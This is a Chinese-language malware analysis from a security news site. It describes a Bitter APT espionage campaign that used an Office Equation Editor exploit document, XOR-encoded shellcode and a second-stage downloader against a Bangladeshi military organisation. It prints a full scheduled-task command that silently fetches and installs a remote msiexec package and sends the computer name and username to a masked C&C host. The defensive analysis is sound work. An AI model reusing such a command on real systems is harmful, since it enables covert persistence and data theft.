---
title: APT组织Bitter网络间谍攻击活动实例分析
url: https://www.secpulse.com/archives/196457.html
source: 安全脉搏
date: 2023-02-22
fetch_date: 2025-10-04T07:41:19.378647
---

# APT组织Bitter网络间谍攻击活动实例分析

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# APT组织Bitter网络间谍攻击活动实例分析

[资讯](https://www.secpulse.com/archives/category/news)

[中孚信息](https://www.secpulse.com/newpage/author?author_id=39013)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2023-02-21

10,655

Bitter(T-APT-17、BITTER、蔓灵花)组织是一个长期针对中国、巴基斯坦等国家进行攻击活动的南亚地区APT组织，因其早期使用的特种木马通信的数据包头部以“BITTER”作为标识而得名。该组织主要针对政府、军工、能源等单位进行攻击以窃取敏感数据，具有强烈的政治背景。

近日，中孚信息威胁研究人员分析了该组织近期一次针对孟加拉国军事机构的攻击活动，攻击者通过利用Office的公式编辑器组件（EQNEDT32.EXE）漏洞，投放恶意诱饵文档和中间恶意软件来部署远程访问木马，进行网络间谍活动。

攻击流程

EQNEDT32.EXE是Office办公软件内的一个公式编辑器组件，该组件存在多个隐藏了很久的远程代码执行漏洞，攻击者可以在office文档中嵌入恶意的公式数据发起攻击，用户打开恶意文档就会中招。

第一阶段，攻击者通过利用具有Office的公式编辑器组件漏洞的恶意文档作为诱饵，诱导用户打开，从而触发漏洞执行恶意shellcode，以下载第二阶段的恶意样本。

第二阶段，攻击者使用了一个名为vc的恶意样本，中孚信息威胁研究人员通过收集受感染计算机名、用户名等敏感信息发送至恶意C&C服务器，创建定时任务以实现持久化操作，并获取下一阶段的恶意载荷。但由于分析时获取载荷的请求已失效无法获取响应内容，所以本文只分析前两阶段的攻击行为。

样本分析（第一阶段）

01

**投递诱饵文档**

第一阶段攻击者使用一个名称为《Repair of different csoc cstc\_ china supplied system - BNS BIJOY.xls》的恶意xls文档作为诱饵诱导受害用户打开以便下载后续的恶意软件，文档信息如下：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961586.jpeg)

02

**执行恶意shellcode获取下一阶段载荷**

用Excel打开发现内容为乱码，点击A1A2方块显示的是一个函数=EMBED("Equation. 3",") ，这表明在打开该文档时会调用Equation. 3程序。如下图所示：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961587.png)

使用Process Monitor工具监控进程行为，发现打开文档后会启动EQNEDT32.EXE程序以便来执行恶意shellcode。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961592.png)

使用Burpsuite抓包发现打开恶意文档后会发起请求http://\*\*\*.com/vc/vc来获取第二阶段的payload。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961593.png)

使用Process Monitor的进程树可以看到下载下来的第二阶段的恶意程序会被移动至C:\$Drw目录下，并重命名为fsutil.exe，然后由EQNEDT32.EXE程序调用explorer.exe来启动该程序。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961598.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-16769615981.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961600.png)

中孚信息威胁研究人员利用oledump查看文档结构发现有如下图所示的几部分组成，将名称为“Equation Native”的部分dump下来，这部分即为攻击者嵌入的恶意shellcode。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961602.png)

03

**使用FF作为XOR key对shellcode进行编码**

2019年Sophos Labs的一份报告中曾分析了一个利用CVE-2018-0798漏洞的maldoc构造器，该构造器使用xor运算对shellcode进行编码。中孚信息威胁研究人员使用二进制编辑工具查看dump的二进制文件，统计发现字节“FF”出现次数较高，猜测可能使用该字节进行异或操作。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961604.png)

将原二进制内容与FF进行异或操作，可看到一些明显的字符串，包括urlmon.dll和下载第二阶段payload的url：\*\*\*.com/vc/vc等。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961614.jpg)

04

**获取下一阶段载荷**

接下来使用x32dbg联合gflags.exe来调试EQNEDT32.EX执行恶意shellcode的过程。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961615.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961618.png)

在urlmon.dll的URLDownloadToFileA API处下断点并运行，如下图所示：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961624.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961629.png)

运行程序直到打断处，可以看到程序停到了上一步打的断点URLDownloadToFileA处，且也可以看到下载第二阶段恶意载荷的url——http://\*\*\*.com/vc/vc。由于分析时该url已经失效无法直接下载恶意载荷。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961632.jpg)

样本分析（第二阶段）

01

**样本信息**

因为分析时下载第二阶段恶意载荷的url已经失效，无法直接下载第二阶段的样本，通过威胁狩猎在微步平台下载了第二阶段的样本并继续分析。样本信息如下：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961634.jpeg)

使用PE工具可以看到是一个第二阶段的样本是一个可执行文件，且创建于2022-5-11.

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961635.png)

02

**解密C&C域名**

利用IDA查看样本中的字符串，可以看到 GET请求及疑似拼接的url字段。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961637.png)

通过调试发现第二阶段的恶意程序首先会解密出恶意C&C域名：m.\*\*\*.com。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961637.jpg)

03

**收集受害主机信息发送至C&C服务器**

解密C&C域名后，紧接着便收集受害计算机名称和用户名拼接到请求中并发送到C&C服务器。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961639.jpg)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961640.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961643.jpg)

恶意样本将收集的信息通过socket发送请求至C&C服务器，但分析时该请求已经失效，无法获取下一阶段的载荷。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961644.jpg)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961645.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961646.png)

04

**设置定时任务以实现持久化操作**

继续调试发现该恶意样本创建了定时任务，任务名称为AdobeUpdater，内容为：schtasks  /create /sc minute /mo 15 /tn AdobeUpdater /tr  "%coMSPec%  /c start /min msiexec /i http://\*\*\*.com/csslogs/vis.php?st=%computername%\*%username% /qn /norestart"  /f，用于每隔15分钟收集计算机名称和用户名并发送至C&C服务器\*\*\*.com，由于分析时请求的URL已经失效，所以无法获取请求后的响应载荷。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-196457-1676961648.jpg)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/197...